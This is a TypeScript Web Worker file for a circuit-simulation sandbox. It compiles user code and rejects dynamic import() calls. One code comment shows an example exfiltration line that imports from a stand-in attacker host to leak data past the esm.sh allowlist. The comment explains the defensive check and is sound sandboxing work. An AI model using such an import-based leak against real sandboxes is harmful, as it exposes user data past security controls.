/**
 * Sandbox worker. Runs all user code and owns all simulation state.
 *
 * Every request goes to the `SessionHost` from `@simten/sandbox/host`:
 * compiles and sessions by id, history and the auto-run loop in here, large
 * ticks in slices.
 *
 * `main.ts` only relays messages and watches for silence: if the worker owes
 * an answer or frames and says nothing for 5s, it's terminated, a new one is
 * started, and every compile and session is replayed at cycle 0.
 *
 * Source compiles, two modes:
 *   No imports  → executeCircuitCode() via new Function()
 *   Has imports → load npm packages via an esm.sh Blob URL module, then
 *                 executeJsCode() with the merged scope
 * Either way the circuits the source builds carry their eval/onTick closures,
 * and each session runs the behavior table of its own compile. Nothing is
 * shared between compiles, so user code can't change another compile's
 * behavior or the stdlib's.
 *
 * Output is plain structured-clone data only: no functions, no class instances.
 */

import { executeCircuitCode, executeJsCode, stripTypes } from '@simten/core/internal';
import { SessionHost, type WorkerRequest } from '@simten/sandbox/host';
import {
  containsDynamicImport,
  extractAndRewriteImports,
  hasImportStatements,
} from './rewrite-imports.js';

async function executeSource(source: string) {
  const js = stripTypes(source);

  // Reject dynamic import(): the static-import rewriter doesn't touch it, so
  // `await import('https://attacker.example/?leak=…')` would bypass the esm.sh
  // allowlist (connect-src doesn't govern import()). See rewrite-imports.ts.
  if (containsDynamicImport(js)) {
    throw new Error(
      'Dynamic import() is not allowed in circuit code. Use a static `import` statement at the top of the file instead.',
    );
  }

  if (!hasImportStatements(js)) return executeCircuitCode(source);

  const { loaderModule, localNames, codeWithoutImports } = extractAndRewriteImports(js);
  let importedMod: Record<string, unknown> = {};
  if (localNames.length > 0) {
    const blobUrl = URL.createObjectURL(new Blob([loaderModule], { type: 'text/javascript' }));
    try {
      importedMod = (await import(/* @vite-ignore */ blobUrl)) as Record<string, unknown>;
    } finally {
      URL.revokeObjectURL(blobUrl);
    }
  }
  const extraScope = Object.fromEntries(localNames.map((n) => [n, importedMod[n]]));
  return executeJsCode(codeWithoutImports, extraScope);
}

const host = new SessionHost({
  post: (message) => self.postMessage(message),
  execute: executeSource,
});

self.onmessage = (event: MessageEvent) => host.handle(event.data as WorkerRequest);
